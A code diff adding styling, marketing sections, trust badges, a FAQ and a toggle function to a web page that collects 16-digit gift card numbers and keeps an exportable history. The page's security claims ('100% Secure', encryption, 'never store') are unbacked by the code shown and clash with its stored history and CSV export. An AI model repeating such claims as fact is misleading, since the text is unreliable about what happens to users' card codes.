@@ -377,17 +377,207 @@
             margin-bottom: 8px;
             font-weight: 600;
         }
+        .hero-section {
+            text-align: center;
+            padding: 40px 0;
+            color: white;
+        }
+        .hero-section h2 {
+            color: white;
+            font-size: 32px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        .hero-section p {
+            font-size: 16px;
+            opacity: 0.95;
+            margin-bottom: 20px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+        .feature-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+        }
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        .feature-card h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        .feature-card p {
+            color: #666;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .how-it-works {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            margin: 40px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .steps-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+        .step {
+            text-align: center;
+        }
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            font-weight: bold;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .step h4 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .step p {
+            color: #666;
+            font-size: 13px;
+        }
+        .trust-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 40px 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .trust-item {
+            text-align: center;
+            flex: 1;
+            min-width: 150px;
+        }
+        .trust-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        .trust-item p {
+            color: #333;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .faq-section {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            margin: 40px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .faq-item {
+            margin-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+            padding-bottom: 20px;
+        }
+        .faq-item:last-child {
+            border-bottom: none;
+        }
+        .faq-question {
+            color: #333;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .faq-question:hover {
+            color: #667eea;
+        }
+        .faq-answer {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+            display: none;
+        }
+        .faq-answer.show {
+            display: block;
+        }
+        .cta-section {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            padding: 40px;
+            margin: 40px 0;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+        .cta-section h2 {
+            color: white;
+            margin-bottom: 15px;
+            display: block;
+        }
+        .cta-section p {
+            color: rgba(255,255,255,0.95);
+            margin-bottom: 25px;
+            font-size: 15px;
+        }
+        .cta-button {
+            background: white;
+            color: #667eea;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+            font-size: 16px;
+            display: inline-block;
+        }
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        .dashboard-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
     </style>
 </head>
 <body>
     <!-- Main Dashboard Page -->
     <div id="dashboardPage" class="page active">
-        <div class="container">
-            <!-- Registration Card -->
-            <div class="card">
-                <h1>💳 Gift Card Balance Checker</h1>
-                <p class="subtitle">Check your gift card balance instantly</p>
+        <!-- Hero Section -->
+        <div class="hero-section dashboard-wrapper">
+            <h2>💳 Gift Card Balance Checker</h2>
+            <p>Instantly check your gift card balance with just a few clicks</p>
+        </div>
 
+        <!-- Balance Checker Form -->
+        <div class="dashboard-wrapper">
+            <div class="card">
+                <p class="subtitle">Enter your 16-digit card number</p>
                 <form id="cardForm">
                     <div class="input-group">
                         <input
@@ -399,7 +589,6 @@
                         />
                         <div class="char-count" id="charCount">0/16 characters</div>
                     </div>
-
                     <button type="submit" id="submitBtn">Check Balance</button>
                 </form>
 
@@ -409,6 +598,131 @@
                 <div class="action-buttons">
                     <button class="registry-btn" onclick="goToRegistry()">⚙️ Settings & History</button>
                 </div>
+            </div>
+        </div>
+
+        <!-- Features Section -->
+        <div class="dashboard-wrapper">
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Instant Results</h3>
+                    <p>Get your gift card balance in seconds, no waiting required</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>100% Secure</h3>
+                    <p>Your data is encrypted and never stored without permission</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📊</div>
+                    <h3>Track History</h3>
+                    <p>Keep a history of all your checked cards with secure access</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📥</div>
+                    <h3>Export Data</h3>
+                    <p>Download your card information as a CSV file anytime</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- How It Works -->
+        <div class="dashboard-wrapper">
+            <div class="how-it-works">
+                <h2 style="color: #333; text-align: center; margin-bottom: 10px;">How It Works</h2>
+                <p style="text-align: center; color: #666; margin-bottom: 30px;">3 simple steps to check your balance</p>
+                <div class="steps-container">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <h4>Enter Card Number</h4>
+                        <p>Input your 16-digit gift card number in the form above</p>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <h4>Click Check Balance</h4>
+                        <p>Submit the form to instantly retrieve your balance</p>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <h4>View & Track</h4>
+                        <p>See your balance and manage your card history securely</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Trust Section -->
+        <div class="dashboard-wrapper">
+            <div class="trust-section">
+                <div class="trust-item">
+                    <div class="trust-icon">✅</div>
+                    <p>Verified & Secure</p>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">⚡</div>
+                    <p>Lightning Fast</p>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">🔐</div>
+                    <p>Privacy Protected</p>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">24/7</div>
+                    <p>Always Available</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ Section -->
+        <div class="dashboard-wrapper">
+            <div class="faq-section">
+                <h2 style="color: #333; text-align: center; margin-bottom: 30px;">Frequently Asked Questions</h2>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>Is my card information safe?</span>
+                        <span>+</span>
+                    </div>
+                    <div class="faq-answer">
+                        Yes, your card information is encrypted and protected. We use industry-standard SSL/TLS encryption to ensure your data is secure. We never store sensitive card details permanently.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>How often can I check my balance?</span>
+                        <span>+</span>
+                    </div>
+                    <div class="faq-answer">
+                        You can check your balance as many times as you want, 24/7. There are no limits on how many checks you can perform. Your history is stored securely for reference.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>What if my card number has a different format?</span>
+                        <span>+</span>
+                    </div>
+                    <div class="faq-answer">
+                        Our system accepts 16-digit alphanumeric card numbers. The form will automatically format your input as you type. Just enter the numbers and letters without spaces.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>Can I export my card history?</span>
+                        <span>+</span>
+                    </div>
+                    <div class="faq-answer">
+                        Yes! Once you access the Settings & History section with your password, you can export all your card data as a CSV file that you can open in Excel or any spreadsheet application.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CTA Section -->
+        <div class="dashboard-wrapper">
+            <div class="cta-section">
+                <h2>Ready to Check Your Balance?</h2>
+                <p>Start checking your gift card balances now with our fast and secure service</p>
+                <button class="cta-button" onclick="document.getElementById('cardInput').focus()">Get Started Now</button>
             </div>
         </div>
     </div>
@@ -678,6 +992,25 @@
                 closeCardDetails();
             }
         });
+
+        // FAQ Toggle
+        function toggleFaq(element) {
+            const question = element;
+            const answer = question.nextElementSibling;
+            const icon = question.querySelector('span:last-child');
+
+            // Close all other FAQs
+            document.querySelectorAll('.faq-answer').forEach(a => {
+                if (a !== answer) {
+                    a.classList.remove('show');
+                    a.previousElementSibling.querySelector('span:last-child').textContent = '+';
+                }
+            });
+
+            // Toggle current FAQ
+            answer.classList.toggle('show');
+            icon.textContent = answer.classList.contains('show') ? '−' : '+';
+        }
 
         // Card Details Modal
         function openCardDetails(card) {
